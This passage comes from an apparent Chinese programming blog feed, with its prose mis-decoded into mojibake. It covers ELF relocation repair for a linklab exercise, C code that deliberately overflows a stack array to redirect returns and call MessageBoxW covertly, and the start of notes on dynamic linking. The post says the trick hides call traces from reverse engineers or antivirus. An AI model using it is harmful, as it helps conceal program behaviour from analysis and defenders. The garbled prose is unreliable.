class="number">4</span>)</span>,%eax</span><br><span class="line">  b2:    f7 d0                not    %eax</span><br><span class="line">  b4:    21 45 08             and    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  b7:    eb 4d                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000b9 &lt;.L11&gt;:</span><br><span class="line">  b9:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  bf:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  c2:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  c5:    c1 e0 08             shl    $0x8,%eax</span><br><span class="line">  c8:    09 45 08             or     %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  cb:    eb 39                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000cd &lt;.L10&gt;:</span><br><span class="line">  cd:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  d3:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  d6:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  d9:    31 45 08             xor    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  dc:    eb 28                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000de &lt;.L9&gt;:</span><br><span class="line">  de:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  e4:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  e7:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  ea:    f7 d0                not    %eax</span><br><span class="line">  ec:    09 45 08             or     %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  ef:    eb 15                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000f1 &lt;.L7&gt;:</span><br><span class="line">  f1:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  f7:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  fa:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  fd:    01 45 08             add    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line"> 100:    eb 04                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">00000102 &lt;.L6&gt;:</span><br><span class="line"> 102:    f7 5d 08             negl   0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line"> 105:    90                   nop</span><br><span class="line"> 106:    8b 45 08             mov    0<span class="title function_">x8</span><span class="params">(%ebp)</span>,%eax</span><br><span class="line"> 109:    5d                   pop    %ebp</span><br><span class="line"> 10a:    c3                   ret    </span><br></pre></td></tr></table></figure><p>getpcå</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5b</span>:    e8 fc ff ff ff       call   <span class="number">5</span>c &lt;transform_code+<span class="number">0x4</span>&gt;<span class="comment">//__x86.get_pc_thunk.ax</span></span><br><span class="line"><span class="number">60</span>:    <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       add    $<span class="number">0x1</span>,%eax</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šä¸‹ä¸€å¥éƒ½æ˜¯è·å–gotè¡¨ä½ç½®çš„é‡å®šä½,ç›´æ¥æŠŠ00000007  00001902 R_386_PC32        00000000   __x86.get_pc_thunk.axè¿™ä¸€ä¸ªä¸€å—æ”¹äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure><p>switch caseéœ€è¦é‡å®šä½çš„åœ°æ–¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">90</span>:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br><span class="line">a6:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br><span class="line">cd:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">92</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">CF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br></pre></td></tr></table></figure><p>ä¿®æ­£åé‡å®šä½è¡¨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x9e0</span> contains <span class="number">35</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000119</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">0000011f</span>  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">00000067</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000083</span>  <span class="number">00000509</span> R_386_GOTOFF      <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000133</span>  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000000</span>c  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000b</span>b  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000061</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>3  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000113</span>  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000092</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>a8  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cf  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000141</span>  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000058</span>   transform_code</span><br><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000016</span>c  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000172</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">0000017</span>d  <span class="number">00002404</span> R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001</span>a0  <span class="number">0000222b</span> R_386_GOT32X      <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>aa  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase6.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">a*aTTgg-K</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è°ƒç”¨æ¬ºéª—æ‹¾é—</title>
      <link href="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/"/>
      <url>/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/</url>
      
        <content type="html"><![CDATA[<h1 id="è°ƒç”¨æ¬ºéª—æ‹¾é—"><a href="#è°ƒç”¨æ¬ºéª—æ‹¾é—" class="headerlink" title="è°ƒç”¨æ¬ºéª—æ‹¾é—"></a>è°ƒç”¨æ¬ºéª—æ‹¾é—</h1><p><a href="https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/">https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/</a> ä¸­æ˜¾ç¤ºçš„è¿è¡Œæ—¶é“¾æ¥é‚£æ®µä»£ç è®©æˆ‘æƒ³èµ·äº†ä¹‹å‰åœ¨lnnksè€å¸ˆé‚£é‡Œï¼Œçœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„code</p><p>ç¯å¢ƒvs2022  x86 Releaseç‰ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    show(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>showå‡½æ•°åˆ©ç”¨æ ˆæº¢å‡ºæŠŠè¿”å›åœ°å€æ‰€å¤„åœ°å€ar[3]æ”¹ä¸ºpfæŒ‡é’ˆæŒ‡çš„å‡½æ•°(pushå‚æ•°åcallå˜›)ï¼Œåªæ”¹è¿”å›åœ°å€pfå‡½æ•°ä¸èƒ½æ­£å¸¸è¿”å›mainçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠpfçš„è¿”å›åœ°å€ar[3]å¤„æ”¹ä¸ºäº†åŸæ¥showçš„è¿”å›åœ°å€ï¼Œå¼¹å‡ºmessageboxåæ­£å¸¸è¿”å›mainå‡½æ•°ï¼Œä½†æ˜¯mainåœ¨retçš„æ—¶å€™ä¼šcrashæ‰</p><p><img src="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/image-20230506154546803.png" alt="image-20230506154546803"></p><p>ä¸ºä»€ä¹ˆå‘¢?</p><p>ç”±äºmessageboxå‡½æ•°æ˜¯winapiï¼ŒWindows APIé»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®__stdcallï¼Œæ‰€ä»¥æœ€åä»¥ä¸€æ¡ret 10hçš„æŒ‡ä»¤æ¥å†…å¹³æ ˆï¼Œshowå‡½æ•°æ˜¯C&#x2F;C++é»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®_cdecl,åœ¨è°ƒç”¨è¿”å›mainåä¼šç”¨ add   esp,14hè¿›è¡Œå¤–å¹³æ ˆï¼Œæ‰€ä»¥æˆ‘ä»¬æ¯”åŸæ¥çš„æ™®é€šshowå‡½æ•°è°ƒç”¨å¤šäº†ä¸€ä¸ªret 10hï¼Œret10hç­‰æ•ˆäº pop eipï¼›add espï¼Œ10h ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¯”åŸæ¥å¤šå¹³äº†20å­—èŠ‚çš„æ ˆ</p><p>æœ€ç®€å•çš„ä¸€ç§æ–¹æ³•ï¼Œæ˜¯åœ¨è°ƒç”¨showä¹‹å‰ç”¨å†…è”æ±‡ç¼–å‹5æ¬¡æ ˆï¼Œæˆ–è€…æˆ‘ä»¬å»åˆ†é…5ä¸ªå››å­—èŠ‚çš„å±€éƒ¨å˜é‡ï¼Œå»å¡«å……ä¸€å—æ ˆç©ºé—´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">     push <span class="number">666</span> </span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//int ar[5]=&#123;0&#125;;</span></span><br><span class="line">    show(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å†³äº†æ ˆçš„é—®é¢˜ä½†ä¸å®Œç¾,æˆ‘ä»¬è¿™æ ·åšè°ƒç”¨çš„ç›®çš„æ˜¯éšè—æ‰è°ƒç”¨ç—•è¿¹å»è¿·æƒ‘é€†å‘åˆ†æçš„äººä¹Ÿå¥½æˆ–è€…æ€è½¯ä¹Ÿå¥½</p><p>pushå®Œ5ä¸ªå‚æ•°åï¼Œshowå‡½æ•°ä¹Ÿè¦pushï¼Œè°å®¶å¥½äººpushåä¸ªå‚æ•°å•Šï¼Œä¸€çœ¼é¡¶çœŸäº†</p><p>æˆ‘ä»¬è°ƒç”¨showè¿”å›mainæ—¶ç”±äºä¸€äº›éæ³•æ“ä½œå¯¼è‡´æ ˆå…¶å®å·²ç»å¹³äº†ï¼Œaddä¼šå¯¼è‡´æ ˆä¸å¹³ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿”å›åœ°å€å¹²å˜›ä¸ç›´æ¥è·³è¿‡è¿™æ¡addæŒ‡ä»¤å‘¢</p><p><img src="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/image-20230506152018853.png" alt="image-20230506152018853"></p><p>ç›´æ¥ar[4]+&#x3D;3;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    (show)(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>showå‡½æ•°æ˜¯cdeclçš„å¤–å¹³æ ˆï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»–å¼ºè½¬ä¸ºstacallåœ¨è°ƒç”¨æ—¶æ¥æŠ¹é™¤è¿™ä¸ªå¤–å¹³æ ˆï¼Œç›¸å½“äºæˆ‘showå‡½æ•°ç¼–è¯‘æˆçš„ä»£ç æ˜¯å¤–å¹³æ ˆçš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è°ƒç”¨æ—¶æŠŠä»–å½“ä½œå†…å¹³æ ˆçš„stdcallï¼Œæ¬ºéª—ç¼–è¯‘å™¨ä¸ç»™æˆ‘ä»¬å¹³æ ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span>  <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(_stdcall* pf)</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    ((pf)show)(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELFåŠ¨æ€é“¾æ¥(ELF Dynamical link)</title>
      <link href="/2023/05/04/ELF-Dynamical-link/"/>
      <url>/2023/05/04/ELF-Dynamical-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Dynamical-link"><a href="#ELF-Dynamical-link" class="headerlink" title="ELF Dynamical link"></a>ELF Dynamical link</h1><p>å¯¹äºé™æ€é“¾æ¥çš„ç¼ºç‚¹</p><ul><li><p>å¯¹äºä¸€äº›å¯ä»¥å…±ç”¨çš„åº“ï¼Œæ¯ä¸ªç¨‹åºåœ¨ç£ç›˜ä¸Šéƒ½æœ‰ä¸€ä»½ä»£ç å‰¯æœ¬ï¼ŒåŠ è½½åˆ°å†…å­˜ä¹Ÿæ˜¯è¿™æ ·ï¼Œé€ æˆäº†ç©ºé—´çš„æµªè´¹</p></li><li><p>é™æ€é“¾æ¥çš„ç¨‹åºæ›´æ–°èµ·æ¥éº»çƒ¦ï¼Œéœ€è¦é‡æ–°ç¼–è¯‘å¹¶å‘é€ç»™ç”¨æˆ·</p></li></ul><h2 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥</h2><p>æ€è·¯:æŠŠç¨‹åºåˆ†ä¸ºä¸åŒçš„æ¨¡å—ï¼Œä¸å†æ˜¯åœ¨ç¼–è¯‘æ—¶è¿›è¡Œé“¾æ¥ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶å†é“¾æ¥ï¼Œè¿™ä¸ªå·¥ä½œç”±åŠ¨æ€é“¾æ¥å™¨æ¥å®Œæˆ</p><blockquote><p>è¿™é‡Œè¯´çš„ä¸åœ¨ç¼–è¯‘æ—¶åšé“¾æ¥ï¼Œå…¶å®è¿˜æ˜¯æœ‰ä¸€ä¸ªæ•´åˆçš„è¿‡ç¨‹çš„ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬åœ¨ä¸»ç¨‹åºé‡Œè°ƒç”¨äº†printfï¼Œå¦‚æœæŒ‰ç…§é™æ€ç¼–è¯‘çš„è¯å°±æ˜¯æŠŠé™æ€åº“libc.aé‡Œçš„printf.oæ¨¡å—å’Œä¸»ç¨‹åºæ¨¡å—åˆå¹¶ï¼Œå¹¶åšé‡å®šä½å·¥ä½œï¼ŒåŠ¨æ€é“¾æ¥çš„è¯å…¶å®ä¹Ÿä¼šæŠŠprintfç¬¦å·ä¿¡æ¯ä»åŠ¨æ€åº“é‡Œæ”¾åˆ°ä¸»ç¨‹åºæ¨¡å—ï¼Œä½†æ˜¯ä¸åšé‡å®šä½ï¼Œé‡å®šä½æ˜¯ç•™åˆ°è¿è¡Œæ—¶å»åšï¼Œå¯ä»¥ç†è§£ä¸ºåŠ¨æ€é“¾æ¥åº“ç»™äº†ä¸»ç¨‹åºä¸€ä¸ªå€Ÿæ¡ï¼Œè¿è¡Œæ—¶æ‰¾åŠ¨æ€é“¾æ¥åº“å»è¦ï¼Œhh</p></blockquote><p>ä¸€äº›å…±ç”¨çš„æ¨¡å—é€æ¸å°±å½¢æˆäº†åŠ¨æ€é“¾æ¥åº“.so</p><p>soï¼Œç¨‹åº&#x3D;ä¸»æ¨¡å—+åŠ¨æ€é“¾æ¥åº“</p><p>æˆ‘ä»¬æŠŠåŠ¨æ€é“¾æ¥åº“æ˜ å°„åˆ°å†…å­˜ä¸€æ¬¡ï¼Œå…¶ä»–ç¨‹åºå†åŠ è½½æ—¶éœ€è¦ç”¨åˆ°åŠ¨æ€é“¾æ¥åº“ï¼Œå°±ä¸ç”¨å†ä»ç£ç›˜åŠ è½½ä¸€ä»½äº†ï¼Œç›´æ¥å»ºä¸ªé¡µç›®å½•æ˜ å°„åˆ°è¿™ä¸€å—å†…å­˜</p><h2 id="åœ°å€æ— å…³"><a href="#åœ°å€æ— å…³" class="headerlink" title="åœ°å€æ— å…³"></a>åœ°å€æ— å…³</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -share -o xx.so x.c å¯ä»¥ç”ŸæˆåŠ¨æ€é“¾æ¥åº“</span><br></pre></td></tr></table></figure><h3 id="share"><a href="#share" class="headerlink" title="-share"></a>-share</h3><p>-shareæ—¶æŒ‡ç¤ºç”ŸæˆåŠ¨æ€é“¾æ¥åº“</p><p>åŠ¨æ€é“¾æ¥è¦å»æŠŠä¸åŒçš„å…±äº«æ¨¡å—åšæ˜ å°„ï¼Œæ˜ å°„åˆ°çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯éšæœºçš„è¿™ä¸ªè¦æ±‚æˆ‘ä»¬å…±äº«æ¨¡å—æ˜¯åœ°å€æ— å…³çš„ï¼Œå°±æ˜¯ä¸ç®¡æ˜ å°„åˆ°å“ªé‡Œéƒ½å¯ä»¥æ‰§è¡Œ</p><blockquote><p>è¿™è®©æˆ‘æƒ³èµ·ï¼Œä¹‹å‰è¯´å¼€äº†pieä¿æŠ¤çš„ç¨‹åºçš„elf headeé‡Œçš„e_typeä¸ºä»€ä¹ˆæ˜¯ET_DYNå…±äº«ç›®æ ‡æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ET_EXECå¯æ‰§è¡Œæ–‡ä»¶çš„åŸå› </p><p><a href="https://grxer.github.io/2023/03/19/23-2-21-elf/">https://grxer.github.io/2023/03/19/23-2-21-elf/</a></p><p>å› ä¸ºå¼€äº†pieåœ°å€æˆ‘ä»¬ç¨‹åºæ˜ å°„çš„è™šæ‹Ÿåœ°å€è¦éšæœºåŒ–ï¼Œå°±è¦æ±‚æˆ‘ä»¬çš„å¯æ‰§è¡Œç¨‹åºä¹Ÿæ˜¯åœ°å€æ— å…³çš„ï¼Œåˆæƒ…åˆç†</p></blockquote><p>åœ°å€æ— 